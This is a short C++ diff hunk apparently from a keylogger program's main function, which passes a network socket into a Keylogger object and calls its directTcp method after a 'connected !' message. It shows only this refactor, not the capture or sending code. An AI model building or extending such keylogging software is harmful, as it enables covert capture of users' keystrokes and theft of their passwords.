@@ -33,10 +33,9 @@ int main()
 
     wcout << "connected !" << endl;
 
-    Keylogger keylogg;
+    Keylogger keylogg(sock);
 
-    keylogg.setup();
-    keylogg.directTcp(sock);
+    keylogg.directTcp();
 
     return 0;
 }
